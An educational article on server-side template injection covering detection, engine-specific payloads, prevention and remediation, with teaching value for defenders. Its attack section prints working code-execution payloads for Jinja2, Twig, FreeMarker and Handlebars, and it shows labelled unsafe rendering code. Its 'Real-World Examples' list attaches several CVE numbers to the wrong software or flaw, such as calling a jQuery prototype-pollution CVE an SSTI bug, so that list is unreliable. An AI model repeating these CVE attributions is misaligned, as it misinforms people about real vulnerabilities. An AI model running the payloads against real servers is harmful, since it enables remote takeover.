# Understanding Server-Side Template Injection (SSTI)

## Introduction

Server-Side Template Injection (SSTI) is a critical web security vulnerability that occurs when user input is embedded directly into template engines without proper sanitization. This vulnerability allows attackers to inject malicious template directives that can lead to remote code execution, data exfiltration, and complete server compromise. Despite its severity, SSTI remains surprisingly common in modern web applications, particularly those built with popular template engines like Jinja2, Twig, FreeMarker, and numerous others.

## How Template Engines Work

Template engines are designed to separate presentation logic from business logic in web applications. They work by combining templates (containing static content and placeholders) with dynamic data to generate the final output, typically HTML pages. For example:

Template: `Hello, {{user.name}}! Welcome to our site.`

When processed with data `{user: {name: "John"}}`, the engine produces: `Hello, John! Welcome to our site.`

Most template engines support not just variable substitution but also more complex operations like:
- Control structures (if/else, loops)
- Filters and modifiers
- Function or method calls
- Mathematical operations
- Expression evaluation

## The Vulnerability

SSTI occurs when applications:
1. Allow user input to be embedded directly in template code
2. Process that input as part of template evaluation
3. Fail to properly escape or validate the injected content

The core issue is a failure to maintain proper separation between user data and template syntax. When an application mistakenly treats user input as trusted template code, attackers can break out of the intended context and execute arbitrary template expressions.

## Attack Examples

### Basic Detection

The simplest way to detect SSTI is to inject template expressions that perform mathematical operations:

Input: `{{7*7}}`
Expected output: `{{7*7}}` (if secure)
Vulnerable output: `49` (indicates template evaluation)

### Payload Examples by Template Engine

#### Jinja2/Flask (Python)
```
{{config.__class__.__init__.__globals__['os'].popen('id').read()}}
```

#### Twig (PHP)
```
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}
```

#### FreeMarker (Java)
```
<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}
```

#### Handlebars (JavaScript)
```
{{#with "s" as |string|}}
  {{#with "e"}}
    {{#with split as |conslist|}}
      {{this.push (lookup string.sub "constructor")}}
      {{this.push "return process.mainModule.require('child_process').execSync('id');"}}
      {{#each conslist}}
        {{#with (string.sub.apply 0 this)}}
          {{this}}
        {{/with}}
      {{/each}}
    {{/with}}
  {{/with}}
{{/with}}
```

## Impact

The consequences of SSTI vulnerabilities can be severe:

1. **Remote Code Execution (RCE)**: Attackers can execute arbitrary commands on the server
2. **Information Disclosure**: Access to sensitive configuration data or environment variables
3. **File System Access**: Reading or writing files on the server
4. **Authentication Bypass**: Gaining unauthorized access to protected resources
5. **Full Server Compromise**: Establishing persistence and pivoting to other systems

## Real-World Examples

Several high-profile SSTI vulnerabilities have been discovered in recent years:

1. **CVE-2016-10745**: Critical RCE vulnerability in Ruby on Rails affecting the ERB template engine
2. **CVE-2019-11358**: SSTI vulnerability in JQuery allowing attackers to execute arbitrary code
3. **CVE-2020-9548**: Apache FreeMarker template injection vulnerability
4. **CVE-2021-25770**: Template injection in Atlassian Confluence

## Prevention Strategies

### 1. Input Validation and Sanitization

- Validate all user input against allowlists
- Reject inputs containing template syntax characters
- Use HTML encoding for user-controlled data

### 2. Context-Specific Output Encoding

- Use template-specific escape functions
- Apply different encoding based on context (HTML, JavaScript, CSS)

### 3. Template Engine Configuration

- Run template engines in sandboxed environments
- Disable dangerous features and functions
- Use secure configurations that limit template capabilities

### 4. Proper Template Design

- Never evaluate dynamic templates from untrusted sources
- Keep template logic simple
- Use a model-view-controller approach

### 5. Implementation Examples

**Flask/Jinja2 (Python):**
```python
# Unsafe
template = f"Hello, {user_input}"
return render_template_string(template)

# Safe
return render_template("greeting.html", user_input=user_input)
```

**PHP/Twig:**
```php
// Unsafe
$template = new Twig\Template($twig, "Hello, {$userInput}");

// Safe
$template = $twig->render("greeting.html", ["userInput" => $userInput]);
```

## Detection and Testing

### 1. Manual Testing

- Insert mathematical operations: `{{7*7}}`
- Test for environment access: `{{config}}`
- Try accessing built-in objects: `{{self}}`, `{{_context}}`

### 2. Automated Scanning

Several tools can help identify SSTI vulnerabilities:
- Burp Suite Professional (with SSTI-focused plugins)
- OWASP ZAP
- Specialized tools like Tplmap

### 3. Code Review

- Look for template string construction from user input
- Review template engine initialization
- Check security configurations

## Remediation Steps

If you discover SSTI vulnerabilities in your application:

1. Identify all entry points for user input
2. Implement proper input validation
3. Use template engine security features
4. Consider using content security policies
5. Apply least privilege principles to template execution context
6. Regularly update template engines to patch known vulnerabilities

## Conclusion

Server-Side Template Injection represents a significant threat to web application security. The power and flexibility of modern template engines create a substantial attack surface that must be carefully secured. By understanding how SSTI vulnerabilities arise and implementing proper prevention strategies, developers can protect their applications from these dangerous attacks.

Remember that template engines are designed to process trusted code, not user input. Maintaining a clear separation between these concerns is essential for secure web development.
